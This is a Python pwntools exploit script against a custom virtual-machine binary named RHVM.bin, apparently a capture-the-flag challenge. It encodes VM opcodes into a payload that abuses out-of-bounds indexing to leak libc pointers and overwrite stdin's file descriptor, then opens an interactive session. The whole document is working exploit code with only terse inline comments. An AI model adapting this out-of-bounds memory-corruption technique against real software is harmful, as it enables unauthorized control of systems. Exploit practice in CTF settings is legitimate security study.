#coding=utf-8
from pwn import *
local = 1
exec_file="./RHVM.bin"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    set $reg = ($text_base+0x0000000000203060)
    b *($text_base+0x0000000000001B15)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))

def opcode(op,idx1,idx2):
    #p = p8(idx2)+p8(idx1)+'\x00\x00'+'\x00\x00\x00'+p8(op)
    p = (op<<16) | (idx1<<8) | idx2 
    return p
def Init(len):
    a.sendlineafter("EIP: ","0")
    a.sendlineafter("ESP: ","0")
    a.sendlineafter("Give me code length: \n",str(len))
    a.recvuntil("Give me code: \n")
def Read(idx1,value):
    return opcode(0x40,idx1,value)
def MovDataToReg(idx1,idx2):
    return opcode(0x42,idx1,idx2)#reg[reg[idx1]] = data[reg[idx2]]
def MovRegToData(idx1,idx2):
    return opcode(0x41,idx1,idx2)#data[reg[idx1]] = reg[idx2]
def SubReg(idx1,idx2):
    return opcode(0xd0,idx1,idx2)
def AddReg(idx1,idx2):
    return opcode(0xa0,idx1,idx2)
def LeftShift(idx1,idx2):
    return opcode(0xe0,idx1,idx2)
def PushReg(idx):
    return opcode(0x70,0,idx)
def PopReg(idx):
    return opcode(0x80,0,idx)
def MulReg(idx1,idx2):
    return opcode(0xc0,idx1,idx2)
payload = [
    Read(1,8),# reg[1] = 12
    Read(2,1),
    SubReg(0,1),# reg[0] = 0-8=-4
    SubReg(0,1),# reg[0] = -16
    Read(3,4),#reg[3] = 4
    MovDataToReg(3,0),# reg[8] = data[-16]
    AddReg(0,2),#reg[0] = -15
    AddReg(3,2),#reg[3] = 5
    MovDataToReg(3,0), # get stderr addr
    Read(6,5),#reg[6] = 5
    Read(7,8),
    AddReg(7,2),#reg[7]= 9
    LeftShift(6,7),
    AddReg(7,1),
    SubReg(7,2),
    SubReg(7,2),
    Read(1,5),
    LeftShift(7,1),
    Read(1,8),
    AddReg(7,1),
    AddReg(7,1),
    AddReg(6,7),
    SubReg(4,6),# ==> stdin.fileno
    SubReg(3,2),
    SubReg(4,3),# ==> stdin.fileno-4

    AddReg(0,1),#reg[0] = -15+8 = -7
    SubReg(0,2),#reg[0] = -8
    SubReg(0,2),#reg[0] = -9
    MovRegToData(0,5),
    SubReg(3,2),#reg[3] = 4
    SubReg(0,2),#reg[0] = -10
    MovRegToData(0,4),
    MulReg(1,1),
    AddReg(1,3),
    AddReg(1,7),
    PushReg(1)# fileno ==> 0x233
]
print len(payload)
Init(len(payload))

for i in payload:
    a.sendline(str(i))

a.interactive()









